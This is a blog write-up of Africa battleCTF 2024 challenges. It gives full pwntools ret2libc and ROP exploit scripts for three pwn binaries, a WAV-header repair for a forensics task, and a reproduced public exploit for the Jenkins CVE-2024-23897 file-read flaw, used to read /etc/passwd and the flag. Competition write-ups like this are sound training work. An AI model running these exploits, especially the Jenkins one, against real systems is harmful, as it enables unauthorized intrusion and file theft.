---
author: pl4int3xt
layout: post
title: Africa battleCTF 2024
date: '2024-10-18'
description: "Only the sharpest minds will make the cut. Eight will qualify, but only one will emerge victorious."
cover: featured.png 
useRelativeCover: true
categories: [Capture The Flag]
---

## Pwn

### Poj

NX and pie are enabled

```bash
checksec poj 
[*] '/home/plaintext/Downloads/ctf/poj/poj'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./'
```

Decompiling with ghidra we get this function that prints the address of `write` and calls `FUN_0010115c`

```c
void FUN_0010117d(void)

{
  write(1,"Africa battle CTF 2024\n",0x17);
  printf("Write() address : %p\n",write);
  FUN_0010115c();
  return;
}
```

`read` gets `0x100` into `64` buffer which is `0x48` from the return address.

```c
void FUN_0010115c(void)

{
  undefined local_48 [64];
  
  read(0,local_48,0x100);
  return;
}
```

The offset is `72`. we extract `write` to calculate libc base. find `system` , `puts` and `/bin/sh`. finally build a rop chain to spawn shell using ret2libc.

```python
from pwn import *
import re
context.update(arch="amd64",os="linux")

filename = './poj'
libc=ELF("./libc.so.6")
e = elf = ELF(filename)

target=remote("challenge.bugpwn.com",1003)

offset=72

target.recv()
banner=target.recv()
write_addr=re.findall(b'0x[a-f0-9]{0,12}',banner)[0]
write_addr=(int(write_addr,0))

libc.address=write_addr - libc.symbols['write']
system=libc.symbols['system']
puts=libc.symbols['puts']
exit_fn=libc.symbols['exit']
shell=next(libc.search(b'/bin/sh\x00'))
pop_rdi=libc.address + 0x0000000000028215

rop=b""
rop+=p64(pop_rdi)
rop+=p64(shell)
rop+=p64(puts)
rop+=p64(pop_rdi)
rop+=p64(shell)
rop+=p64(system)
payload=b"A" * offset + rop
target.sendline(payload)
target.interactive()
```

Running the code we get the flag

```bash
plaintext@archlinux ~/D/c/poj (2)> python sol.py
[*] '/home/plaintext/Downloads/ctf/poj (2)/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
[*] '/home/plaintext/Downloads/ctf/poj (2)/poj'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./'
[+] Opening connection to challenge.bugpwn.com on port 1003: Done
[*] Switching to interactive mode
/bin/sh
$ ls
flag.txt
libc.so.6
poj
$ cat flag.txt
battleCTF{Libc_J0P_b4s1c_000_bc8a769d91ae062911c32829608e7d547a3f54bd18c7a7c2f5cc52bd}
$ 
```

### Kami
We first patch the binary

```bash
patchelf kami --set-interpreter ./ld-linux-aarch64.so.1 --set-rpath "./" kami
```

No pie and no stack canary

```bash
checksec kami 
[*] '/home/plaintext/Downloads/kami/kami'
    Arch:       aarch64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3e0000)
    RUNPATH:    b'./'
    Stripped:   No
```

Decompiling with ghidra `fflush` address is leaked and another function kami is called

```c
undefined8 main(void)

{
  int iVar1;
  
  iVar1 = printf("fflush at %p\n",fflush);
  kami(iVar1);
  return 0;
}
```

Kami uses a dangerous function `gets` which can be used for buffer overflow 

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void kami(void)

{
  char acStack_80 [128];
  
  printf("Welcome to Africa battleCTF.!");
  fflush(_stdout);
  gets(acStack_80);
  return;
}
```

The offset is `136` . So we need to extract the leaked address of `fflush` , find the address of `system`, `/bin/sh` and `puts` and lastly the gadgets to call `system(/bin/sh)`.

Using ropper we get these two gadgets to use

```bash
0x0000000000027b38: ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
0x0000000000049620: mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
```

We then build the exploit

```python
from pwn import *
import re

filename = './kami'
libc=ELF("./libc.so.6")

target=remote("challenge.bugpwn.com",1000)

leak=target.recv()
fflush_leak = int(re.findall(b'0x[a-f0-9]+',leak)[0].decode(),0)

libc.address = fflush_leak - 0x00000000006b590
system=libc.address +0x000000000049480
puts=libc.address +0x00000000006da70
exit=libc.address +0x00000000003c760
shell=next(libc.search(b'/bin/sh\x00'))

payload = b''
payload += 128 * b'A'
payload += 8 * b'B'
payload += p64(libc.address + 0x0000000000027b38) 
payload += (8 * 3) * b'C'
payload += p64(libc.address + 0x0000000000049620)
payload += p64(shell)
payload += (8 * 2) * b'D'
payload += p64(libc.sym.system)
target.sendline(payload)
target.interactive()
```

Running the code we get the flag

```bash
plaintext@archlinux ~/D/c/kami> python sol.py
[*] '/home/plaintext/Downloads/ctf/kami/libc.so.6'
    Arch:       aarch64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to challenge.bugpwn.com on port 1000: Done
[*] Switching to interactive mode
$ ls
flag.txt
kami
sh
$ cat flag.txt
battleCTF{0n_Th3_W4yT0_Pwn_IOT_ARM_4f2cc97958831e0481a9a62304b6704a}
```

### Terminal

32 bit binary with no canary and no pie.

```bash
plaintext@archlinux ~/D/ctf> checksec terminal 
[*] '/home/plaintext/Downloads/ctf/terminal'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
```

Decompiling the code in binary ninja we get this function with a while loop

```c
int32_t sub_804974d()

{
    void* const __return_addr_1 = __return_addr;
    void* var_10 = &arg_4;
    sub_804968c();
    
    while (true)
    {
        fflush(*(uint32_t*)stdout);
        void* const var_2c;
        printf("\x1b[0;32mCLI@RAVEN\x1b[0;37m# ", var_2c);
        fflush(*(uint32_t*)stdout);
        sub_8049648();
        char* eax_3 = strchr(&data_804c060, 0xa);
        
        if (eax_3 != 0)
            *(uint8_t*)eax_3 = 0;
        
        var_2c = &data_804a244;
        char* eax_5 = strtok(&data_804c060, &data_804a244);
        
        if (eax_5 != 0)
        {
            char* eax_6 = strtok(nullptr, &data_804a244);
            char* eax_7 = strtok(nullptr, &data_804a244);
            
            if (strcmp(eax_5, "show") != 0)
            {
                var_2c = "clear";
                
                if (strcmp(eax_5, "clear") != 0)
                {
                    var_2c = "exit";
                    
                    if (strcmp(eax_5, "exit") == 0)
                        break;
                    
                    puts("Invalid command. Type 'show help…");
                }
                else
                    sub_8049722();
            }
            else
            {
                var_2c = &data_804a24b;
                
                if ((strcmp(eax_6, &data_804a24b) == 0 && eax_7 == 0))
                {
                    sub_8049226();
                    continue;
                }
                
                var_2c = &data_804a04c;
                
                if ((strcmp(eax_6, &data_804a04c) == 0 && eax_7 == 0))
                {
                    sub_8049255();
                    continue;
                }
                
                var_2c = "down";
                
                if ((strcmp(eax_6, "down") == 0 && eax_7 == 0))
                {
                    sub_804939c();
                    continue;
                }
                
                var_2c = "logs";
                
                if ((strcmp(eax_6, "logs") == 0 && eax_7 == 0))
                {
                    sub_80494e3();
                    continue;
                }
                
                var_2c = "help";
                
                if ((strcmp(eax_6, "help") == 0 && eax_7 == 0))
                {
                    sub_80495a0();
                    continue;
                }
                
                puts("Invalid command. Type 'show help…");
            }
        }
    }
    
    puts("Exiting...");
    return 0;
}
```

It runs this code to get the user input which uses a dangerous function 

```c
char* sub_8049648()

{
    void buf;
    read(0, &buf, 0xc8);
    return strcpy(&data_804c060, &buf);
}

```

We get the offset is `62`. 0x3a + 4 = 62.

```c
08049662  8d45c6             lea     eax, [ebp-0x3a {buf}]
```

To exploit the binary we need use elf.sym.puts to leak elf.got.strcpy in the got. calculate LIBC base address, get `/bin/sh` , `system` and `puts` address. Create a rop chain to spawn `/bin/sh` using ret2libc. The exploit did not first work because of the libc version in use i used libc.rip using the leaked puts address `0xf7d93aa0` to get a version. i then downloaded https://libc.rip/download/libc6-i386_2.39-0ubuntu8_amd64.so.

![img-description](5.png)

We then update the libc version

```python
from pwn import *

filename = './terminal'
e = elf = ELF(filename)

target=remote("20.199.76.210",1005)
libc=ELF("./libc6-i386_2.39-0ubuntu8_amd64.so")
main=0x8049757
offset=62

rop=b""
rop+=p32(elf.plt.puts)
rop+=p32(main)
rop+=p32(elf.got.strcpy)
payload=b"A" * offset + rop
target.sendlineafter(b'#',payload)

leaked_addresses=[]
for i in range(6):
  leaked_addresses.append((hex(u32(target.recv(4).strip().ljust(4,b"\x00")))))

puts_index=(leaked_addresses.index("0x80490d6")) - 1
puts_leak=int(leaked_addresses[puts_index],0)

print("puts address : " + str(hex(puts_leak)))
libc.address=puts_leak-libc.sym['puts']
system=libc.symbols['system']
puts=libc.symbols['puts']
exit_fn=libc.symbols['exit']
shell=next(libc.search(b'/bin/sh\x00'))

rop=b""
rop+=p32(system)
rop+=p32(exit_fn)
rop+=p32(shell)
payload=b"A" * offset + rop
target.sendlineafter(b'#',payload)
target.interactive()
```

Running the code we get the flag

```bash
plaintext@archlinux ~/D/ctf> python terminal.py
[*] '/home/plaintext/Downloads/ctf/terminal'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
[+] Opening connection to 20.199.76.210 on port 1005: Done
[*] '/home/plaintext/Downloads/ctf/libc6-i386_2.39-0ubuntu8_amd64.so'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
puts address : 0xf7d93aa0
[*] Switching to interactive mode
 $ ls
flag.txt
services.txt
services_logs.txt
terminal
$ cat flag.txt
battleCTF{ret2CLI@dlresolve_a22c24101f31bb15ea7ac818364c980c3fd8ab0a9ed99f023a5c6910a30ee52d}
```

## Forensics

### Do(ro X2 )

Using FTK Imager we use the provided password and we get the flag at `C:\\Users\\Desktop\\Delano\\Documents\\Image`
> Analyze the file. Extensive manipulation is required to uncover what’s hidden within.

### Symphony

We are given a file `Note.txt` .Opening the file we get hex code with this first line that appears to have some hex values stripped

```bash
52 49 ❌❌ 6c 26 05 00 10 00 00 00 01 00 01 00 40 1f 00 00 40 1f 00 00 01 00 08 00 64 61 74 61 48 26 05 00 80 83 91 ab cb e3
```

The first two hex code values match with the magic bytes of RIFF.

```bash
52 49 46 46
```

but a RIFF file has a header section that is `52 49 46 46` then the file size in little-endian format that is `6C 26 05 00` then the format identifier `10 00 00 00`. Then we have data chunks that is `64 61 74 61` but no format chunk that was present to describe the audio encoding format and so we need to insert it manually before the data chunk. I assumed a PCM (Pulse-Code Modulation) format.

```bash
Offset 0x0C: 'fmt ' (66 6D 74 20)
Offset 0x10: Subchunk size (0x10 for PCM, meaning 16 bytes for the format chunk)
Offset 0x14: Audio format (0x01 for PCM)
Offset 0x16: Number of channels (0x01 for mono or 0x02 for stereo)
Offset 0x18: Sample rate (e.g., 0x1F40 = 8000 Hz)
Offset 0x1C: Byte rate (SampleRate * NumChannels * BitsPerSample/8)
Offset 0x20: Block align (NumChannels * BitsPerSample/8)
Offset 0x22: Bits per sample (e.g., 8 or 16)
```

Next we need to change the file to match the above pattern

```bash
52 49 46 46 6C 26 05 00 57 41 56 45   ; "RIFF" + file size + "WAVE"
66 6D 74 20 10 00 00 00 01 00 01 00   ; 'fmt ' chunk + size + audio format
40 1F 00 00 80 3E 00 00 01 00 08 00   ; Sample rate + byte rate + block align + bits/sample
64 61 74 61 48 26 05 00               ; 'data' chunk identifier + data size
```

From this

```bash
52 49 46 46 6C 26 05 00 10 00 00 00 01 00 01 00 40 1F 00 00 40 1F 00 00 01 00 08 00 64 61 74 61
```

To this 

```bash
52 49 46 46 6C 26 05 00 57 41 56 45 66 6D 74 20 10 00 00 00 01 00 01 00 40 1F 00 00 80 3E 00 00 01 00 08 00 64 61 74 61
```

Then create a python script to convert the hexcode to a binary file with the extension .wav

```python
def hex_to_wav(input_file, output_file):
    try:
        with open(input_file, 'r') as file:
            hex_data = file.read().replace(' ', '').replace('\n', '')
        
        binary_data = bytes.fromhex(hex_data)
        
        with open(output_file, 'wb') as wav_file:
            wav_file.write(binary_data)
        
        print(f"Successfully created WAV file: {output_file}")
    except Exception as e:
        print(f"Error: {e}")

input_file = 'note.txt'
output_file = 'output.wav'
hex_to_wav(input_file, output_file)
```

Opening the file it sounded like a morse code. https://morsecode.world/international/decoder/audio-decoder-adaptive.html 

![img-description](1.png)

The websites gave slightly different output and i had to combine both to try and get the correct flag https://databorder.com/transfer/morse-sound-receiver/


![img-description](2.png)

## Web
### Jenkins

After opening the challenge We get a login page for jenkins. 

![img-description](3.png)

Navigating to http://web.challenge.bugpwn.com:8080/user/admin/ we find the version of jenkins 2.441

![img-description](4.png)

Checking for public cve. Found CVE-2024-23897 https://www.exploit-db.com/exploits/51993

```python
# Exploit Title: Jenkins 2.441 - Local File Inclusion
# Date: 14/04/2024
# Exploit Author: Matisse Beckandt (Backendt)
# Vendor Homepage: https://www.jenkins.io/
# Software Link: https://github.com/jenkinsci/jenkins/archive/refs/tags/jenkins-2.441.zip
# Version: 2.441
# Tested on: Debian 12 (Bookworm)
# CVE: CVE-2024-23897

from argparse import ArgumentParser
from requests import Session, post, exceptions
from threading import Thread
from uuid import uuid4
from time import sleep
from re import findall

class Exploit(Thread):
  def __init__(self, url: str, identifier: str):
    Thread.__init__(self)
    self.daemon = True
    self.url = url
    self.params = {"remoting": "false"}
    self.identifier = identifier
    self.stop_thread = False
    self.listen = False

  def run(self):
    while not self.stop_thread:
      if self.listen:
        self.listen_and_print()

  def stop(self):
    self.stop_thread = True

  def receive_next_message(self):
    self.listen = True

  def wait_for_message(self):
    while self.listen:
      sleep(0.5)

  def print_formatted_output(self, output: str):
    if "ERROR: No such file" in output:
      print("File not found.")
    elif "ERROR: Failed to parse" in output:
      print("Could not read file.")

    expression = "No such agent \"(.*)\" exists."
    results = findall(expression, output)
    print("\n".join(results))

  def listen_and_print(self):
    session = Session()
    headers = {"Side": "download", "Session": self.identifier}
    try:
      response = session.post(self.url, params=self.params, headers=headers)
    except (exceptions.ConnectTimeout, exceptions.ConnectionError):
      print("Could not connect to target to setup the listener.")
      exit(1)

    self.print_formatted_output(response.text)
    self.listen = False

  def send_file_request(self, filepath: str):
    headers = {"Side": "upload", "Session": self.identifier}
    payload = get_payload(filepath)
    try:
      post(self.url, data=payload, params=self.params, headers=headers, timeout=4)
    except (exceptions.ConnectTimeout, exceptions.ConnectionError):
      print("Could not connect to the target to send the request.")
      exit(1)

  def read_file(self, filepath: str):
    self.receive_next_message()
    sleep(0.1)
    self.send_file_request(filepath)
    self.wait_for_message()

def get_payload_message(operation_index: int, text: str) -> bytes:
  text_bytes = bytes(text, "utf-8")
  text_size = len(text_bytes)
  text_message = text_size.to_bytes(2) + text_bytes
  message_size = len(text_message)

  payload = message_size.to_bytes(4) + operation_index.to_bytes(1) + text_message
  return payload

def get_payload(filepath: str) -> bytes:
  arg_operation = 0
  start_operation = 3

  command = get_payload_message(arg_operation, "connect-node")
  poisoned_argument = get_payload_message(arg_operation, f"@{filepath}")

  payload = command + poisoned_argument + start_operation.to_bytes(1)
  return payload

def start_interactive_file_read(exploit: Exploit):
  print("Press Ctrl+C to exit")
  while True:
    filepath = input("File to download:\n> ")
    filepath = make_path_absolute(filepath)
    exploit.receive_next_message()

    try:
      exploit.read_file(filepath)
    except exceptions.ReadTimeout:
      print("Payload request timed out.")

def make_path_absolute(filepath: str) -> str:
    if not filepath.startswith('/'):
      return f"/proc/self/cwd/{filepath}"
    return filepath

def format_target_url(url: str) -> str:
  if url.endswith('/'):
    url = url[:-1]
  return f"{url}/cli"

def get_arguments():
  parser = ArgumentParser(description="Local File Inclusion exploit for CVE-2024-23897")
  parser.add_argument("-u", "--url", required=True, help="The url of the vulnerable Jenkins service. Ex: http://helloworld.com/")
  parser.add_argument("-p", "--path", help="The absolute path of the file to download")
  return parser.parse_args()

def main():
  args = get_arguments()
  url = format_target_url(args.url)
  filepath = args.path
  identifier = str(uuid4())

  exploit = Exploit(url, identifier)
  exploit.start()

  if filepath:
    filepath = make_path_absolute(filepath)
    exploit.read_file(filepath)
    exploit.stop()
    return

  try:
    start_interactive_file_read(exploit)
  except KeyboardInterrupt:
    pass
  print("\nQuitting")
  exploit.stop()

if __name__ == "__main__":
  main()            
```

Reading `/etc/passwd` 

```bash
python cve.py -u http://web.challenge.bugpwn.com:8080 -p "/etc/passwd"
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

Next was to locate where the flag was. After a few struggles i found the location of the flag

```bash
python cve.py -u http://web.challenge.bugpwn.com:8080 -p "/etc/flag.txt"
battleCTF{I_Tr4vEl_T0_battleCTF_3bb8a0f488816fc377fc0cde93f2e0b1d4c1f9fda09dfaa4962d44d5a09f8fdb}
```